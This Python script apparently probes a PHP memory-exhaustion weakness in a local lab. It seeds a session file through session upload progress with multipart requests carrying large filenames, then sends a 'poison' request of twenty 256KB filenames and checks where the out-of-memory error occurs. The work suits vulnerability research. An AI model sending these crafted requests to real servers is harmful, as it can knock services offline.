#!/usr/bin/env python3
"""Seed-then-poison probe: if the session file already contains accumulated
upload_progress entries, does the poison request's OOM move INTO the serializer
(zend_smart_str.c) instead of the multipart parser (zend_string.h)?

Phase 1: SEED small multipart requests with SAME sid (each appends progress
entries with moderately sized filenames to sess_<sid>).
Phase 2: one poison request (20x256KB filenames) with the SAME sid.
Measure error.log OOM site of the poison.
"""
import http.client, os, signal, subprocess, sys, time

PORT = 8098
PHP = sys.argv[1]
WORK = sys.argv[2]
NSEED = int(sys.argv[3]) if len(sys.argv) > 3 else 4
SEEDFNAME = int(sys.argv[4]) if len(sys.argv) > 4 else 131072  # 128KB filenames in seed

def part(name, value, fname=None):
    b = "--BOUNDARYX\r\nContent-Disposition: form-data; name=\"%s\"" % name
    if fname:
        b += "; filename=\"%s\"" % fname
    b += "\r\n\r\n"
    return b.encode() + value + b"\r\n"

def small_body(sid, key, fname_len):
    return (part("PHPSESSID", sid.encode()) +
            part("PHP_SESSION_UPLOAD_PROGRESS", key.encode()) +
            part("f0", b"DATA", "S" * fname_len) +
            part("f1", b"DATA", "T" * fname_len) +
            part("f2", b"DATA", "U" * fname_len) +
            b"--BOUNDARYX--\r\n")

def poison_body(sid, key, nfiles=20):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(nfiles):
        b += part("f%d" % i, b"X", "A" * 262144)
    return b + b"--BOUNDARYX--\r\n"

def post(port, body, timeout=45):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    t0 = time.perf_counter()
    c.request("POST", "/", body, {
        "Content-Type": "multipart/form-data; boundary=BOUNDARYX",
        "Content-Length": str(len(body))})
    r = c.getresponse()
    data = r.read()
    dt = time.perf_counter() - t0
    st = r.status
    c.close()
    return st, dt

def main():
    os.makedirs(WORK + "/docroot/sess", exist_ok=True)
    with open(WORK + "/docroot/index.php", "w") as f:
        f.write('<?php echo "OK\\n";')
    with open(WORK + "/lab.ini", "w") as f:
        f.write("""memory_limit=16M
session.upload_progress=On
session.use_strict_mode=0
session.save_path=%s/docroot/sess
error_log=%s/error.log
display_errors=0
log_errors=1
max_execution_time=30
upload_max_filesize=64M
post_max_size=64M
max_file_uploads=50
""" % (WORK, WORK))
    srv = subprocess.Popen([PHP, "-S", "127.0.0.1:%d" % PORT, "-t", WORK + "/docroot",
                            "-c", WORK + "/lab.ini"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           preexec_fn=os.setsid)
    time.sleep(1.2)
    elog = WORK + "/error.log"
    sid = "seedsid0001"
    try:
        print("seed,http,latency_s,sess_bytes")
        for k in range(NSEED):
            try:
                st, dt = post(PORT, small_body(sid, "seed%d" % k, SEEDFNAME))
            except Exception:
                st, dt = -1, -1.0
            sp = "%s/docroot/sess/sess_%s" % (WORK, sid)
            sz = os.path.getsize(sp) if os.path.exists(sp) else -1
            print("%d,%s,%.3f,%d" % (k, st, dt, sz), flush=True)
        prev = os.path.getsize(elog) if os.path.exists(elog) else 0
        try:
            st, dt = post(PORT, poison_body(sid, "poison"))
        except Exception:
            st, dt = -1, -1.0
        sp = "%s/docroot/sess/sess_%s" % (WORK, sid)
        sz = os.path.getsize(sp) if os.path.exists(sp) else -1
        print("poison,%s,%.3f,%d" % (st, dt, sz), flush=True)
        time.sleep(0.3)
        chunk = ""
        if os.path.exists(elog):
            with open(elog, "rb") as f:
                f.seek(prev)
                chunk = f.read().decode("utf-8", "replace")
        print("--- poison-phase error.log ---")
        print(chunk if chunk else "(none)")
    finally:
        os.killpg(srv.pid, signal.SIGKILL)
        srv.wait()

if __name__ == "__main__":
    main()
